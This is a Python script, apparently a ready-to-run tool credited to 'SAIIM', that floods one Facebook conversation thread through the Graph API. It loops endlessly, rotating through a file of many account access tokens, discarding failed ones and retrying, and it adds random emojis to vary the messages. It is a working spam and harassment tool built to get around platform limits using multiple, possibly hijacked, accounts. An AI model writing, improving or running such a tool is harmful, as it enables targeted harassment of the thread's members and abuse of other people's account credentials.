import os
import sys
import time
import json
import requests
import random
from datetime import datetime

# Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'

CONFIG_FILE = "config.json"

def print_banner():
    os.system("clear")
    print(f"{RED}   _____ _____ _____ _____ \n  / ____|_   _|  __ \_   _|\n | (___   | | | |  | || |  \n  \___ \  | | | |  | || |  \n  ____) |_| |_| |__| || |_ \n |_____/|_____|_____/_____|\n\n       --- S A I I M ---{RESET}")

def load_config():
    if not os.path.isfile(CONFIG_FILE):
        print(f"{RED}[x] config.json not found! Run convo.py first to generate it.{RESET}")
        sys.exit()
    with open(CONFIG_FILE, "r") as f:
        return json.load(f)

def get_profile_name(token):
    url = "https://graph.facebook.com/v15.0/me"
    try:
        r = requests.get(url, params={"access_token": token}, timeout=10)
        data = r.json()
        return data.get("name", "Unknown")
    except:
        return "Unknown"

def send_message(thread_id, message, token):
    url = f"https://graph.facebook.com/v15.0/t_{thread_id}"
    payload = {
        "access_token": token,
        "message": message
    }
    try:
        r = requests.post(url, data=payload, timeout=10)
        if r.ok:
            return True, None
        else:
            err = r.json().get("error", {}).get("message", "Unknown error")
            return False, err
    except Exception as e:
        return False, str(e)

def load_lines(path):
    if not os.path.exists(path):
        print(f"{RED}[x] File not found: {path}{RESET}")
        sys.exit()
    with open(path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def main():
    print_banner()
    config = load_config()

    token_file = config["token_file"]
    thread_id = config["thread_id"]
    prefix = config.get("prefix", "")
    message_file = config["message_file"]
    delay = int(config["delay"])

    tokens = load_lines(token_file)
    messages = load_lines(message_file)
    emojis = [" 3:)", " :)", " :3", " ^_^", " :D", " ;)", " :P", " \u2764", " \u2639"]

    invalid_tokens = set()
    msg_index = 0
    token_index = 0

    print(f"{YELLOW}--- Live Logs (press Ctrl+C to stop) ---{RESET}")
    while True:
        tokens = load_lines(token_file)
        available_tokens = [t for t in tokens if t not in invalid_tokens]

        if not available_tokens:
            print(f"{RED}[!] All tokens are currently invalid. Retrying in 60s...{RESET}")
            time.sleep(60)
            invalid_tokens.clear()
            continue

        current_token = available_tokens[token_index % len(available_tokens)]
        msg = f"{prefix} {messages[msg_index % len(messages)]} {random.choice(emojis)}"
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"{CYAN}THIS TOOL MADE BY SAIIM{RESET}")
        success, err = send_message(thread_id, msg, current_token)

        if success:
            name = get_profile_name(current_token)
            print(f"{GREEN}[{now}] Message sent from '{name}': {msg}{RESET}")
            msg_index += 1
        else:
            print(f"{RED}[{now}] Failed (Token): {err}{RESET}")
            invalid_tokens.add(current_token)

        token_index += 1
        time.sleep(delay)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Stopped by user.{RESET}")
        sys.exit()
